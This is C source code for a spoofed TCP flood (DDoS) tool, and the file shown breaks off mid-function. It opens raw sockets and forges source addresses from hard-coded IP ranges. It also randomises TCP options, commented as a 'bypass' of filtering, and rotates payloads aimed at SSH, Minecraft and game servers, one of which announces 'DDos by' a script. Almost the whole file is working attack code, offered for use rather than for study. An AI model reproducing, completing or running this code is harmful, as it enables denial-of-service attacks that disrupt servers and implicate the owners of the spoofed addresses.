/*
 * This is released under the GNU GPL License v3.0, and is allowed to be used for commercial products ;)
 * Use clang for build this
 */
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
int Combo;
int payloads;

struct tcpopts { //tcp options Mod this for bypass
        uint8_t msskind;
        uint8_t msslen;
        uint16_t mssvalue;
        uint8_t nop_nouse;
        uint8_t wskind;
        uint8_t wslen;
        uint8_t wsshiftcount;
        uint8_t nop_nouse2;
        uint8_t nop_nouse3;
        uint8_t sackkind;
        uint8_t sacklen;
        uint8_t tstamp;
        uint8_t tslen;
        uint8_t tsno;
        uint8_t tsval;
        uint8_t tsclock;
        uint8_t tsclockval;
        uint8_t tssendval;
        uint8_t tsecho;
        uint8_t tsecho2;
        uint8_t tsecho3;
        uint8_t tsecho4;
        u_int32_t timeLen:8;
        u_int32_t timeOpt:8;
        u_int32_t winNOP:8;
        u_int32_t win:8;
        u_int32_t timeEcho;
        u_int32_t time;
};

void init_rand(unsigned long int x) //rand
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
unsigned long int rand_cmwc(void)
{
	unsigned long long int t, a = 18782LL;
	static unsigned long int i = 4095;
	unsigned long int x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}

int randnum(int min_num, int max_num) {
        int result = 0, low_num = 0, hi_num = 0;

        if (min_num < max_num)
        {
                low_num = min_num;
                hi_num = max_num + 1;
        } else {
                low_num = max_num + 1;
                hi_num = min_num;
        }


        result = (rand_cmwc() % (hi_num - low_num)) + low_num;
        return result;
}

unsigned short csum (unsigned short *buf, int count)
{
	register unsigned long sum = 0;
	while( count > 1 ) { sum += *buf++; count -= 2; }
	if(count > 0) { sum += *(unsigned char *)buf; }
	while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
	return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph, int pipisize, int payload) { //check sum for make tcp sum OK
        struct tcp_pseudo
        {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr) + pipisize + payload);
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + pipisize + payload;
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr) + pipisize + payload);
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}

void setup_ip_header(struct iphdr *iph) //setup ipheader
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = MAXTTL; //time to live
	iph->protocol = 6;
	iph->check = 0;
	iph->saddr = inet_addr("192.168.3.100");
}

void setup_tcp_header(struct tcphdr *tcph)
{
        tcph->syn = 0;
	tcph->source = htons(5678);
	tcph->seq = rand();
	tcph->ack_seq = rand();
	tcph->res2 = 0;
	tcph->doff = 5;
	tcph->ack = 0;
	tcph->window = rand();
	tcph->check = 0;
	tcph->urg_ptr = 0;
}

int ctos[3] = {0, 40, 72};
uint8_t shiftcount[5] = {0x00, 0x03, 0x06, 0x09, 0x08};
//making cool func so opts are randomised whilst only 2 being random and me too lazy to make betta kode
void rand_options(struct tcpopts *opts) {//setup options tcp
        opts->nop_nouse = 0x01;
        opts->nop_nouse2 = 0x01;
        opts->nop_nouse3 = 0x01;
        opts->msskind = 0x02;
        opts->mssvalue = htons(1460);
        opts->msslen = 0x04;
        opts->wskind = 0x03;
        opts->wslen = 0x03;
        opts->wsshiftcount = 0x07;
        opts->sackkind = 0x04;
        opts->sacklen = 0x02;
        opts->tstamp = 0x08;
        opts->tslen = 0x0a;
        opts->tsno = randnum(1, 250);
        opts->tsval = 0xd8;
        opts->tsclock = 0xd9;
        opts->tsclockval = 0x68;
        opts->tssendval = 0xa3;
        opts->tsecho = 0x00;
        opts->tsecho2 = 0x00;
        opts->tsecho3 = 0x00;
        opts->tsecho4 = 0x00;
        opts->timeOpt = htons(8);
        opts->timeLen = htons(10);
        opts->time = 0x31d5ffbc;
}

void *flood(void *par1) //main 
{
	char *td = (char *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
        struct tcpopts *opts = (void *)iph + sizeof(struct iphdr) + sizeof(struct tcphdr);
	
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(floodport);
	sin.sin_addr.s_addr = inet_addr(td);
        int randomports[7] = {21791,21789,21790,80,443,25565,22};

	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(s < 0){
		fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}
	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setup_tcp_header(tcph);
        rand_options(opts);

        if (floodport == 0) { //random ports systeam
        tcph->dest = htons(randomports[rand() % 7]);
        } else {
        tcph->dest = htons(floodport);
        }
    

	iph->daddr = sin.sin_addr.s_addr;
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);

	int tmp = 1;
	const int *val = &tmp;
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}

	init_rand(time(NULL));
	register unsigned int i;
        register unsigned int ipc = 0100000000;
        uint32_t ul_dst;
	i = 0;
        int randpacket;
	while(1){
            int random_class = (rand() % 68) + 1;
            if(random_class == 1){ //Spoofed Thai ips 
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 | 
                        (184 & 0xFF) << 16 |
                        (22 & 0xFF) << 8 |
                        (184 & 0xFF);
                }
                if(random_class == 2){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (120 & 0xFF) << 16 |
                        (87 & 0xFF) << 8 |
                        (115 & 0xFF);
                }
                if(random_class == 3){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (76 & 0xFF) << 16 |
                        (6 & 0xFF) << 8 |
                        (171 & 0xFF);
                }
                if(random_class == 4){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (130 & 0xFF) << 16 |
                        (47 & 0xFF) << 8 |
                        (1 & 0xFF);
                }
                if(random_class == 5){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (174 & 0xFF) << 16 |
                        (115 & 0xFF) << 8 |
                        (112 & 0xFF);
                }
                if(random_class == 6){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (7 & 0xFF) << 16 |
                        (16 & 0xFF) << 8 |
                        (154 & 0xFF);
                }
                if(random_class == 7){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (206 & 0xFF) << 16 |
                        (144 & 0xFF) << 8 |
                        (203 & 0xFF);
                }
                if(random_class == 8){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (189 & 0xFF) << 16 |
                        (91 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 9){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (190 & 0xFF) << 16 |
                        (91 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 10){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (191 & 0xFF) << 16 |
                        (91 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 11){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (180 & 0xFF) << 16 |
                        (212 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 12){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (181 & 0xFF) << 16 |
                        (212 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 13){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (182 & 0xFF) << 16 |
                        (212 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 14){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (183 & 0xFF) << 16 |
                        (212 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 15){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (188 & 0xFF) << 16 |
                        (246 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 16){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (189 & 0xFF) << 16 |
                        (246 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 17){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (190 & 0xFF) << 16 |
                        (246 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 18){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (191 & 0xFF) << 16 |
                        (246 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 19){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (72 & 0xFF) << 16 |
                        (253 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 20){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (73 & 0xFF) << 16 |
                        (253 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 21){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (74 & 0xFF) << 16 |
                        (253 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 22){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (75 & 0xFF) << 16 |
                        (253 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 23){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (96 & 0xFF) << 16 |
                        (59 & 0xFF) << 8 |
                        (119 & 0xFF);
                }
                if(random_class == 24){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (97 & 0xFF) << 16 |
                        (59 & 0xFF) << 8 |
                        (119 & 0xFF);
                }
                if(random_class == 25){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (98 & 0xFF) << 16 |
                        (59 & 0xFF) << 8 |
                        (119 & 0xFF);
                }
                if(random_class == 26){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (99 & 0xFF) << 16 |
                        (59 & 0xFF) << 8 |
                        (119 & 0xFF);
                }
                if(random_class == 27){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (244 & 0xFF) << 16 |
                        (70 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 28){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (245 & 0xFF) << 16 |
                        (70 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 29){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (246 & 0xFF) << 16 |
                        (70 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 30){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (247 & 0xFF) << 16 |
                        (70 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 31){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (138 & 0xFF) << 16 |
                        (208 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 32){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (139 & 0xFF) << 16 |
                        (208 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 33){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (152 & 0xFF) << 16 |
                        (210 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 34){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (153 & 0xFF) << 16 |
                        (210 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 35){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (193 & 0xFF) << 16 |
                        (233 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 36){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (192 & 0xFF) << 16 |
                        (233 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 37){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (rand_cmwc() & 0xFF) << 16 |
                        (128 & 0xFF) << 8 |
                        (180 & 0xFF);
                }
                if(random_class == 38){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (231 & 0xFF) << 16 |
                        (50 & 0xFF) << 8 |
                        (147 & 0xFF);
                }
                if(random_class == 39){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (73 & 0xFF) << 16 |
                        (253 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 40){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (74 & 0xFF) << 16 |
                        (253 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 41){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (75 & 0xFF) << 16 |
                        (253 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 42){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (96 & 0xFF) << 16 |
                        (59 & 0xFF) << 8 |
                        (119 & 0xFF);
                }
                if(random_class == 43){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (97 & 0xFF) << 16 |
                        (59 & 0xFF) << 8 |
                        (119 & 0xFF);
                }
                if(random_class == 44){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (166 & 0xFF) << 16 |
                        (78 & 0xFF) << 8 |
                        (185 & 0xFF);
                }
                if(random_class == 45){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (181 & 0xFF) << 16 |
                        (22 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 46){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (182 & 0xFF) << 16 |
                        (22 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 47){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (72 & 0xFF) << 16 |
                        (253 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 48){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (73 & 0xFF) << 16 |
                        (253 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 49){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (74 & 0xFF) << 16 |
                        (253 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 50){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (75 & 0xFF) << 16 |
                        (253 & 0xFF) << 8 |
                        (103 & 0xFF);
                }
                if(random_class == 51){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (19 & 0xFF) << 16 |
                        (98 & 0xFF) << 8 |
                        (141 & 0xFF);
                }
                if(random_class == 52){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (18 & 0xFF) << 16 |
                        (98 & 0xFF) << 8 |
                        (141 & 0xFF);
                }
                if(random_class == 53){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (212 & 0xFF) << 16 |
                        (80 & 0xFF) << 8 |
                        (212 & 0xFF);
                }
                if(random_class == 54){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (213 & 0xFF) << 16 |
                        (80 & 0xFF) << 8 |
                        (212 & 0xFF);
                }
                if(random_class == 55){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (214 & 0xFF) << 16 |
                        (80 & 0xFF) << 8 |
                        (212 & 0xFF);
                }
                if(random_class == 56){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (215 & 0xFF) << 16 |
                        (80 & 0xFF) << 8 |
                        (212 & 0xFF);
                }
                if(random_class == 57){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (16 & 0xFF) << 16 |
                        (98 & 0xFF) << 8 |
                        (141 & 0xFF);
                }
                if(random_class == 58){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (17 & 0xFF) << 16 |
                        (98 & 0xFF) << 8 |
                        (141 & 0xFF);
                }
                if(random_class == 59){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (18 & 0xFF) << 16 |
                        (98 & 0xFF) << 8 |
                        (141 & 0xFF);
                }
                if(random_class == 60){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (19 & 0xFF) << 16 |
                        (98 & 0xFF) << 8 |
                        (141 & 0xFF);
                }
                if(random_class == 61){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (92 & 0xFF) << 16 |
                        (159 & 0xFF) << 8 |
                        (203 & 0xFF);
                }
                if(random_class == 62){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (93 & 0xFF) << 16 |
                        (159 & 0xFF) << 8 |
                        (203 & 0xFF);
                }
                if(random_class == 63){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (94 & 0xFF) << 16 |
                        (159 & 0xFF) << 8 |
                        (203 & 0xFF);
                }
                if(random_class == 64){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (95 & 0xFF) << 16 |
                        (159 & 0xFF) << 8 |
                        (203 & 0xFF);
                }
                if(random_class == 65){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (16 & 0xFF) << 16 |
                        (98 & 0xFF) << 8 |
                        (141 & 0xFF);
                }
                if(random_class == 66){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (17 & 0xFF) << 16 |
                        (98 & 0xFF) << 8 |
                        (141 & 0xFF);
                }
                if(random_class == 67){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (18 & 0xFF) << 16 |
                        (98 & 0xFF) << 8 |
                        (141 & 0xFF);
                }
                if(random_class == 68){
                ul_dst = (rand_cmwc() >> 24 & 0xFF) << 24 |
                        (19 & 0xFF) << 16 |
                        (98 & 0xFF) << 8 |
                        (141 & 0xFF);
                }

		iph->saddr = ul_dst;
		iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
		iph->check = csum ((unsigned short *) datagram, iph->tot_len);
		tcph->seq = rand_cmwc() & 0xFFFF;
        rand_options(opts);

        if (payloads == 0) { //payload system
                int okakanine = 0;
                char op[32] = "\xB3\xD4\x00\x16\x56\x75\x17\x4E\x00\x00\x00\x00\x80\x02\xFA\xF0\x14\xA4\x00\x00\x02\x04\x05\xB4\x01\x03\x03\x08\x01\x01\x04\x02"; //open Connections payloads
                char ssh[48] = "\xB3\xD4\x00\x16\x56\x75\x17\x4F\xD4\xE2\x51\x9A\x50\x18\x02\x04\x14\xB4\x00\x00\x53\x53\x48\x2D\x32\x2E\x30\x2D\x4D\x6F\x54\x54\x59\x5F\x52\x65\x6C\x65\x61\x73\x65\x5F\x30\x2E\x37\x37\x0D\x0A";//sshpayload
                char req[34] = "\x20\x00\x00\x00\xB4\x9A\x20\x40\x28\x2B\x21\x40\x2B\x2B\x21\x40\x43\x48\x44\x34\x53\x4E\x48\x25\x43\x2B\x21\x40\x2A\x2B\x21\x40\x6E\x69"; // Minecraft Payloads
                char nine1337[8] = "\x6E\x69\x6E\x65\x31\x33\x33\x37"; //akanine payloads
                char bigdick[22] = "\x44\x44\x6F\x73\x20\x62\x79\x20\x62\x69\x67\x64\x69\x63\x6B\x20\x73\x63\x72\x69\x70\x74";
                randpacket = (rand() % 5) + 1;
                if(randpacket == 1 ) {
                        okakanine = sizeof(op);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), op, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine; //send payloads
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->syn = 0;
                        tcph->psh = 1;
                        tcph->ack = 1;
                }
                if(randpacket == 2 ) {
                        okakanine = sizeof(ssh);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), ssh, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;//send payloads
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->syn = 1;
                        tcph->psh = 0;
                        tcph->ack = 0;
                }
                if(randpacket == 3 ) {
                        okakanine = sizeof(req);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), req, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;//send payloads
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->syn = 0;
                        tcph->psh = 1;
                        tcph->ack = 1;
                }if(randpacket == 4 ) {
                        okakanine = sizeof(nine1337);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), nine1337, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;//send payloads
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->syn = 1;
                        tcph->psh = 0;
                        tcph->ack = 0;
                }if(randpacket == 5 ){
                        okakanine = sizeof(bigdick);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), bigdick, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->syn = 1;
                        tcph->psh = 0;
                        tcph->ack = 0;
                }
        } else if (payloads == 1) {
                int okakanine = 0;
                char bigdick[22] = "\x44\x44\x6F\x73\x20\x62\x79\x20\x62\x69\x67\x64\x69\x63\x6B\x20\x73\x63\x72\x69\x70\x74";
                char abus[24] = "\x02\x04\x05\xb4\x04\x02\x08\x0a\x00\xd9\x68\xa3\x00\x00\x00\x00\x01\x03\x03\x07\xfe\x04\xf9\x89";
                randpacket = (rand() % 2) + 1;
                if(randpacket == 1 ){
                        okakanine = sizeof(abus);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), abus, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->syn = 1;
                        tcph->ack = 0;
                        tcph->psh = 0;
                }if(randpacket == 2 ){
                        okakanine = sizeof(bigdick);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), bigdick, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->syn = 1;
                        tcph->ack = 0;
                        tcph->psh = 0;
                }
        } else if (payloads == 2) {
                int okakanine = 0;
                char req[16] = "\x10\x00\x00\x00\xB1\x9A\x20\x40\x28\x2B\x21\x40\x2B\x2B\x21\x40";
                char user[38] = "\x26\x00\x01\x00\x00\x00\x69\x63\x65\x74\x79\x31\x33\x33\x37\x00\x00\x00\x00\x00\x00\x00\x3E\xE2\x24\xBC\xAA\x8F\xF8\xCE\x3E\xE2\x24\xBC\xAA\x8F\xF8\xCE";//getstatus
                char reg[32] = "\x20\x00\x00\x00\xB4\x9A\x20\x40\x28\x2B\x21\x40\x2B\x2B\x21\x40\x43\x48\x44\x34\x53\x4E\x48\x25\x43\x2B\x21\x40\x2A\x2B\x21\x40";
                char fullrp[57] = "\x67\x61\x6d\x65\x6d\x6f\x64\x65\x74\x65\x78\x74\xd8\xce\x63\xdd\xf9\xa4\x75\xf2\x88\x45\xf4\xd1\x50\x18\x04\x01\xf2\x1c\x00\x00\x0e\x00\x03\x0b\x2f\x72\x70\x73\x69\x61\x6d\x66\x75\x6c\x6c";
                char spawn[56] = "\x72\x63\x6f\x6e\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\xd8\xce\x63\xdd\xf9\xa4\x8c\x21\x88\x4e\x8b\xf5\x50\x18\x03\xfd\xf2\x17\x00\x00\x09\x00\x03\x06\x2f\x73\x70\x61\x77\x6e";
                char ping[54] = "\x68\x6f\x73\x74\x6e\x61\x6d\x65\xd8\xce\x63\xdd\xf9\xa4\xbe\xf8\x88\xd6\x7c\x33\x50\x18\x04\x01\xf2\x16\x00\x00\x08\x00\x03\x05\x2f\x70\x69\x6e\x67";
                char skin[62] = "\x6c\x61\x6e\x67\x75\x61\x67\x65\xd8\xce\x63\xdd\xf9\xa4\xcc\xa8\x89\x36\x11\xe5\x50\x18\x03\xfd\xf2\x1d\x00\x00\x0f\x00\x03\x0c\x2f\x73\x6b\x69\x6e\x20\x75\x70\x64\x61\x74\x65";
                char baltop[63] = "\x65\x63\x68\x6f\x65\x78\x69\x74\xd8\xce\x63\xdd\xf9\xa4\xd7\x93\x89\xa3\xdb\x47\x50\x18\x04\x00\xf2\x18\x00\x00\x0a\x00\x03\x07\x2f\x62\x61\x6c\x74\x6f\x70";
                char siamemoji[72] = "\x72\x63\x6f\x6e\xd8\xce\x63\xdd\xf9\xa5\x74\xee\x8a\x89\xef\xb1\x50\x18\x04\x00\xf2\x1f\x00\x00\x11\x00\x03\x0e\x2f\x73\x69\x61\x6d\x65\x6d\x6f\x6a\x69\x20\xee\x9e\xb7";
                char onepacket1[4] = "\x03\x00\x03\x01";
                char bigdick[22] = "\x44\x44\x6F\x73\x20\x62\x79\x20\x62\x69\x67\x64\x69\x63\x6B\x20\x73\x63\x72\x69\x70\x74";

                randpacket = (rand() % 11) + 1;
                // randpacket = 1;
                if(randpacket == 1 ){
                        okakanine = sizeof(req);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), req, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->ack = 1;
                        tcph->psh = 1;
                        tcph->syn = 0;
                }if(randpacket == 2 ){
                        okakanine = sizeof(user);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), user, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->ack = 1;
                        tcph->psh = 1;
                        tcph->syn = 0;
                }if(randpacket == 3 ){
                        okakanine = sizeof(reg);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), reg, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->ack = 1;
                        tcph->psh = 1;
                        tcph->syn = 0;
                }if(randpacket == 4 ){
                        okakanine = sizeof(fullrp);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), fullrp, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->ack = 1;
                        tcph->psh = 1;
                        tcph->syn = 0;
                }if(randpacket == 5 ){
                        okakanine = sizeof(spawn);
                        memcpy((void *)tcph  + sizeof(struct tcphdr) + sizeof(struct tcpopts), spawn, okakanine);
                        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + okakanine;
                        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts), okakanine);
                        tcph->ack = 1;
